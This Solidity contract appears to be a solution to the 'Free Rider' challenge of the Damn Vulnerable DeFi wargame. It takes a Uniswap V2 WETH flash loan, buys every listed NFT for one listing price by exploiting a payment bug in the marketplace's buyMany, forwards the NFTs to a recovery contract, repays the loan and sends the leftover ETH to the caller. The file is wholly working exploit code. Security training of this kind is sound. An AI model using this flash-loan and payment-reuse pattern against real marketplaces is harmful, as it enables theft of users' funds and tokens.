// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "../vendors/IWETH.sol";

import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";

import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

contract FreeRiderExploit is IUniswapV2Callee {
    IUniswapV2Pair pair;
    FreeRiderRecovery recovery;
    FreeRiderNFTMarketplace marketplace;
    WETHInterface weth;
    IERC20 token;
    DamnValuableNFT nft;

    uint256 listingPrice = 15 ether;

    constructor(
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _recovery,
        IUniswapV2Pair _pair,
        WETHInterface _weth,
        IERC20 _token,
        DamnValuableNFT _nft
    ) {
        pair = _pair;
        weth = _weth;
        token = _token;
        marketplace = _marketplace;
        recovery = _recovery;
        nft = _nft;
    }

    // So we can receive ETH
    receive() external payable {}

    // So we can receive NFT's
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function uniswapV2Call(address, uint, uint, bytes memory _data) external {
        (, uint256 amount) = abi.decode(_data, (address, uint));

        // Calculate the required fee
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        weth.withdraw(weth.balanceOf(address(this)));

        // Create an array of the NFT tokenId's that we are going to take
        uint256[] memory tokenIds = new uint256[](marketplace.offersCount());

        for (uint256 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        // Purchase all the NFT's
        marketplace.buyMany{value: listingPrice}(tokenIds);

        bytes memory data = abi.encode(address(this));

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, data);
        }

        // Due to the bug in the purchase method, we will still have the ETH, so convert back to WETH including the fee
        weth.deposit{value: amountToRepay}();

        weth.transfer(address(pair), amountToRepay);
    }

    function runExploit() external payable {
        bytes memory data = abi.encode(address(weth), listingPrice);

        // Take out a WETH flashloan equal to the listingPrice
        pair.swap(listingPrice, 0, address(this), data);

        // After the flashloan uniswapV2Call hook fires, send the caller the ETH
        Address.sendValue(payable(msg.sender), address(this).balance);
    }
}
